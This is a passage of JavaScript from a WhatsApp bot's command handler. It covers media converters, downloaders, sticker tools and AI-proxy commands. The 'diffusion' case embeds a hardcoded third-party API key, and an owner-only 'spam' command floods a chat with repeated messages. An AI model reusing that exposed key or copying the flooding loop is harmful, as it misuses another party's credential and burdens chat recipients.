ArielStore.sendMessage(m.chat, { react: { text: `☑️`, key: m.key }})
}
} catch (e) {
ArielStore.sendMessage(m.chat, { react: { text: `✖️`, key: m.key }})
}
}
break
case 'removebg': case 'nobg':{
if (!quoted) return replygcaespisp(`Send/Reply Image With Caption ${prefix + command}`)
if (!/image/.test(mime)) return replygcaespisp(`Send/Reply Image With Caption ${prefix + command}`)
let q = m.quoted ? m.quoted : m
let media = await q.download()
let url = await uploadImage(media)
let anu = await fetch(`https://aemt.me/removebg?url=${url}`)
let data = await anu.json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Here you go!`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url: data.result}}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
}
break
case'tozombie':{
if (!quoted) return replygcaespisp(`Send/Reply Image With Caption ${prefix + command}`)
if (!/image/.test(mime)) return replygcaespisp(`Send/Reply Image With Caption ${prefix + command}`)
let q = m.quoted ? m.quoted : m
let media = await q.download()
let url = await uploadImage(media)
let anu = await fetch(`https://aemt.me/converter/zombie?url=${url}`)
let data = await anu.json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Here you go!`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url: data.url}}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
}
break
case'toanime':{
if (!quoted) return replygcaespisp(`Send/Reply Image With Caption ${prefix + command}`)
if (!/image/.test(mime)) return replygcaespisp(`Send/Reply Image With Caption ${prefix + command}`)
let q = m.quoted ? m.quoted : m
let media = await q.download()
let url = await uploadImage(media)
let gpt = await (await fetch(`https://itzpire.com/tools/jadianime?url=${url}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Here you go!`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url:gpt.result}}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
}
break
case 'capcut':{
if (!text) return replygcaespisp(`Enter the link\nExample\nhttps://www.capcut.net/sharevideo?template_id=7239111787965205762&language=in&region=ID`)
await ArielStore.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
try{  
let anu = await fetchJson(`https://aemt.me/download/capcut?url=${text}`)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Here you go!`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: anu.result.video_ori}}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
await ArielStore.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
}catch (error) {
await ArielStore.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
}
}
break 
case 'smeme': case 'stickermeme': case 'stickmeme': {

if (!/webp/.test(mime) && /image/.test(mime)) {
if (!text) return replygcaespisp(`Usage: ${prefix + command} text1|text2`)
let { TelegraPh } = require('./lib/uploader')

atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
mee = await ArielStore.downloadAndSaveMediaMessage(quoted)

mem = await TelegraPh(mee)

meme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem}`

memek = await ArielStore.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.ownername })


} else {
replygcaespisp(`Send/reply image with caption ${prefix + command} text1|text2`)
}
}

break

case'smeta': {
if (!/webp/.test(mime)) return replygcaespisp('Reply sticker!')
  var stiker = false
    try {
        let [packname, ...author] = q.split('|')
            //var author = (author  []).join('|')
                let mime = m.quoted.mimetype || ''
                        //let img = await q.download()
                            let img = await ArielStore.downloadAndSaveMediaMessage(quoted, makeid(5))
                                if (!img) return replygcaespisp('Reply a sticker!')
                                    var stiker = await addExifAvatar(img, `Ariel Store`, `Aespi Botz`)
                                      } catch (e) {
                                          console.error(e)
                                              if (Buffer.isBuffer(e)) stiker = e
                                                } finally {
                                                    if (stiker) ArielStore.sendMessage(m.chat, {
                                                          sticker: stiker
                                                              }, {
                                                                    quoted: m
                                                                        })
                                                                            else return replygcaespisp('reply sticker')
                                                                              }
                                                                              }       
                                                                              break
case 'instagram2': case 'ig2':{
if (!text) return replygcaespisp(`Enter the link!!!`)
if (!isUrl(args[0])) return replygcaespisp(`Where is the link?`)
await ArielStore.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
try{   
let anu = await fetchJson(`https://aemt.me/download/igdl?url=${text}`)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Here you go!`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: anu.result[0].url }}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
await ArielStore.relayMessage(m.chat, msgs.message, {})
await ArielStore.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})  
}catch (error) {
await ArielStore.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
}
}
break
case 'itunes': {
if (!text) return replygcaespisp('Please provide a song name')
  try {
    let res = await fetch(`https://api.popcat.xyz/itunes?q=${encodeURIComponent(text)}`)
    if (!res.ok) {
      throw new Error(`API request failed with status ${res.status}`)
    }
    let json = await res.json()
    console.log('JSON response:', json)
    let songInfo = 
    `*Song Information:*\n
     • *Name:* ${json.name}\n
     • *Artist:* ${json.artist}\n
     • *Album:* ${json.album}\n
     • *Release Date:* ${json.release_date}\n
     • *Price:* ${json.price}\n
     • *Length:* ${json.length}\n
     • *Genre:* ${json.genre}\n
     • *URL:* ${json.url}`
    // Check if thumbnail is present, then send it with songInfo as caption
    if (json.thumbnail) {
      let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: songInfo
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({image: {url:json.thumbnail}}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
await ArielStore.relayMessage(m.chat, msgs.message, {})
    } else {
      replygcaespisp(songInfo)
    }
  } catch (error) {
    console.error(error)
  }
}
break
case 'spam':
				if (!aespispTheCreator) return aespispStickOwner()
					if (!text) return replygcaespisp(`Use ${prefix +command} text|amount`)
				aespisparg = text.split("|")
				if (!aespisparg) return replygcaespisp(`Use ${prefix+ command} text|amount`)
				if (Number(aespisparg[1]) >= 50) return replygcaespisp('Max 50!')
				if (isNaN(aespisparg[1])) return replygcaespisp(`must be a number`)
				for (let i = 0; i < aespisparg[1]; i++){
					ArielStore.sendMessage(from, {text: aespisparg[0]})
				}
				break
case 'simisimi': case 'simi':
if (!text) replygcaespisp('What do u want to ask?')
let simi = await fetchJson(`https://aemt.me/simi?text=${text}`)
const simi2 = simi.result
ArielStore.sendMessage(m.chat, {text: simi2}, {quoted: m})
break
case 'clearall': {
if (!aespispTheCreator) return aespispStickOwner()
ArielStore.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat)
}
break
case 'pinchat': {
if (!aespispTheCreator) return aespispStickOwner()
if (m.isGroup) return aespispStickPrivate()
ArielStore.chatModify({ pin: true }, m.chat)
}
break
case 'unpinchat': {
if (!aespispTheCreator) return aespispStickOwner()
if (m.isGroup) return aespispStickPrivate()
ArielStore.chatModify({ pin: false }, m.chat)
}
break
case 'database': {
if (!aespispTheCreator) return aespispStickOwner()
totalreg = Object.keys(global.db.data.users).length
    let rtotalreg = Object.values(global.db.data.users).filter(user => user.registered == true).length
    replygcaespisp(`*${totalreg} users using Bot*`)
}
break 
case 'getjoinrequest':{
	if (!m.isGroup) return aespispStickGroup()
	if (!isBotAdmins) return aespispStickBotAdmin()
if (!isAdmins && !aespispTheCreator) return aespispStickAdmin()
	const response = await ArielStore.groupRequestParticipantsList(m.chat);
  if (!response || !response.length) {
    ArielStore.sendMessage(m.chat, {text: 'No pending join requests. ✅'}, {quoted:m});
    return;
  }
  let replyMessage = `${themeemoji} Join Request List:\n`;
  response.forEach((request, index) => {
    const { jid, request_method, request_time } = request;
    const formattedTime = new Date(parseInt(request_time) * 1000).toLocaleString();
    replyMessage += `\n*No.: ${index + 1} Request Details. 👇*`;
    replyMessage += `\n🧟‍♂️ *JID:* ${jid}`;
    replyMessage += `\n🧪 *Method:* ${request_method}`;
    replyMessage += `\n⏰ *Time:* ${formattedTime}\n`;
  });

  ArielStore.sendMessage(m.chat, {text: replyMessage}, {quoted:m});
};
break
case 'twitter': case 'twitterdl': case 'twitterdl': {
	if (!args[0]) return replygcaespisp(`📌 Example : \n*${prefix + command}* https://twitter.com/fernandavasro/status/1569741835555291139?t=ADxk8P3Z3prq8USIZUqXCg&s=19`)
	if (!isUrl(args[0]) && !args[0].includes('twitter.com')) return replygcaespisp('Link Invalid!')
          try {
          let { SD, HD, desc, thumb, audio } = await fg.twitter(args[0])
          let te = ` 
┌─⊷ *TWITTER DL*
▢ Description: ${desc}
└───────────`
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: te
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({video: {url:HD}}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
await ArielStore.relayMessage(m.chat, msgs.message, {})
} catch (e) {
  	replygcaespisp(`Verify that the link is from Twitter`)
	}
}
break
case 'gita-verse': case 'gita': case 'bhagavatgita': {
	try {
    // Extract the verse number from the command text.
    let verseNumber = m.text.split(' ')[1]
    if (!verseNumber || isNaN(verseNumber)) {
      verseNumber = Math.floor(Math.random() * 700) + 1
    }
    let res = await fetch(`https://gita-api.vercel.app/odi/verse/${verseNumber}`)
    if (!res.ok) {
      let error = await res.json()
      throw new Error(
        `API request failed with status ${res.status} and message ${error.detail[0].msg}`
      )
    }
    let json = await res.json()
    console.log('JSON response:', json)
    let gitaVerse = `
🕉 *Bhagavad Gita: Sacred Teachings*\n
📜 *Chapter ${json.chapter_no}: ${json.chapter_name}*\n
Verse ${json.verse_no}:\n
" ${json.verse} "\n
*🔮 Translation:*\n
${json.translation}\n
*🧘‍♂️ Spiritual Insight (Purport):*\n
${json.purport}`
    replygcaespisp(gitaVerse)
    if (json.audio_link) {
      ArielStore.sendMessage(m.chat, {audio: {url:json.audio_link}, mimetype: 'audio/mp4', ptt: true}, {quoted:m})
    }
  } catch (error) {
    console.error(error)
    // Handle the error appropriately
  }
}
break
case 'apk': {
	try {
    if (command === 'apk') {
      if (!text) return replygcaespisp(`*[❗] Please provide the APK Name you want to download.*`);
      let data = await download(text);
      if (data.size.replace(' MB', '') > 200) {
        return await ArielStore.sendMessage(m.chat, { text: '*[⛔] The file is too large.*' }, { quoted: ftroli });
      }
      if (data.size.includes('GB')) {
        return await ArielStore.sendMessage(m.chat, { text: '*[⛔] The file is too large.*' }, { quoted: ftroli });
      }
      await ArielStore.sendMessage(
        m.chat,
        { document: { url: data.dllink }, mimetype: 'application/vnd.android.package-archive', fileName: data.name + '.apk', caption: null },
        { quoted: m }
      )
    }
  } catch {
    return replygcaespisp(`*[❗] An error occurred. Make sure to provide a valid link.*`);
  }
};
break
case 'mega':{
	try {
if (!text) return replygcaespisp(`${prefix + command} https://mega.nz/file/ovJTHaQZ#yAbkrvQgykcH_NDKQ8eIc0zvsN7jonBbHZ_HTQL6lZ8`);
const { File } = require('megajs');
        const file = File.fromURL(text);
        await file.loadAttributes();
        if (file.size >= 300000000) return replygcaespisp('Error: File size is too large (Maximum Size: 300MB)');
        const downloadingMessage = `🌩️ Downloading file... Please wait.`;
        replygcaespisp(downloadingMessage);
        const caption = `*_Successfully downloaded..._*\nFile: ${file.name}\nSize: ${formatBytes(file.size)}`;
        const data = await file.downloadBuffer();
        const fileExtension = path.extname(file.name).toLowerCase();
        const mimeTypes = {
            ".mp4": "video/mp4",
            ".pdf": "application/pdf",
            ".zip": "application/zip",
            ".rar": "application/x-rar-compressed",
            ".7z": "application/x-7z-compressed",
            ".jpg": "image/jpeg",
            ".jpeg": "image/jpeg",
            ".png": "image/png",
        };
        let mimetype = mimeTypes[fileExtension] || "application/octet-stream";
        await ArielStore.sendMessage(m.chat, {document: data, mimetype: mimetype, fileName: file.name, caption: caption}, {quoted:m});
    } catch (error) {
        return replygcaespisp(`Error: ${error.message}`);
    }
}
break
case 'diffusion':{
if (!text) return replygcaespisp('What do u want to make?')
    let myHeaders = new Headers();
    myHeaders.append("Content-Type", "application/json");
    let raw = JSON.stringify({
        "key": "TouFyL4VyhWWNhqC3DnF5hAdR2fLXxgGY4Gpe4BqC8YGKE2j4NjuNrJAXetE",
        "prompt": text,
        "negative_prompt": "ugly, deformed, noisy, blurry, distorted, out of focus, bad anatomy, extra limbs, poorly drawn face, poorly drawn hands, missing fingers",
        "width": "720",
        "height": "720",
        "samples": "1",
        "num_inference_steps": "20",
        "seed": null,
        "guidance_scale": 7.5,
        "safety_checker": "yes",
        "multi_lingual": "no",
        "panorama": "no",
        "self_attention": "no",
        "upscale": "no",
        "embeddings_model": null,
        "webhook": null,
        "track_id": null
    });
    var requestOptions = {
        method: 'POST',
        headers: myHeaders,
        body: raw,
        redirect: 'follow'
    };
    try {
        let response = await fetch("https://stablediffusionapi.com/api/v3/text2img", requestOptions);
        let result = await response.json();
        let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Diffusion AI\n\n' + result.meta.prompt
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: result.output[0] } }, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
await ArielStore.relayMessage(m.chat, msgs.message, {})
    } catch (error) {
        console.log('error', error);
        let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: text
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: `${error.config.url}` } }, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
await ArielStore.relayMessage(m.chat, msgs.message, {})
    }
}
break
case 'indo-ai': {
	if (!text) return replygcaespisp(`*• Example:* ${prefix + command} halo`)
try {
let gpt = await (await fetch(`https://itzpire.com/ai/gpt-web?q=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Indo AI' + '\n\n' + gpt.result
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image:  fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
await ArielStore.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcaespisp("`*Error*`")
}
}
break
case 'photoleap': {
	if (!text) return replygcaespisp(`*• Example:* ${prefix + command} blue sea`);
  let currentTime = Date.now();
  let lastUsed = 0;
  if (currentTime - lastUsed < 10000) return replygcaespisp("Cooldown 10 seconds, try again later");
  lastUsed = currentTime;
  try {
    let gpt = await (await fetch(`https://tti.photoleapapp.com/api/v1/generate?prompt=${text}`)).json();
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Photo Leap AI\n\n' + text
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.result_url } }, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
await ArielStore.relayMessage(m.chat, msgs.message, {})
  } catch(e) {
    return replygcaespisp("`*Error*`");
  }
}
break
case 'ai':
case 'openai': {
	if (!text) return replygcaespisp(`*• Example:* ${prefix + command} what is your name`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/gpt?model=gpt-4&q=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Chat GPT\n\n' + gpt.data.response
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image:  fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
await ArielStore.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcaespisp("`*Error*`")
}
}
    break
        case 'animate': {
	if (!text) return replygcaespisp(`*• Example:* ${prefix + command} a cat chasing mouse`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/animate-diff?prompt=${text}`)).json()
const response = await axios.get(gpt.data.image_urls, { responseType: 'arraybuffer' })
const buffer = Buffer.from(response.data, "utf-8")
var fetchedgif = await GIFBufferToVideoBuffer(buffer)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Animation AI\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: fetchedgif }, { upload: ArielStore.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
